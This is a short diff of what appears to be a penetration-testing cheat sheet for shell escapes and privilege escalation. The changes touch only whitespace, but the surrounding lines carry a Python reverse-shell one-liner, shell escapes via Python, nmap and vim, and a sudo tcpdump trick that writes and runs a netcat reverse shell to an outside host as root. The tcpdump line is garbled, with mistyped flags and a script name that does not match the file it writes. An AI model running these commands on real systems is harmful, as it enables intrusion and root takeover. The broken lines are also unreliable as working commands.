@@ -8,8 +8,7 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SO
 
 python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
 
-Plesse check below:   
-
+Plesse check below:    
 PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$
 
 **BASH**
@@ -27,7 +26,7 @@ OR
 OR        
 `!sh`    //from nmap
 
-Plesse check below:
+Plesse check below:   
 `:set shell=/bin/bash:shell`
 
 echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root      //from tcpdump
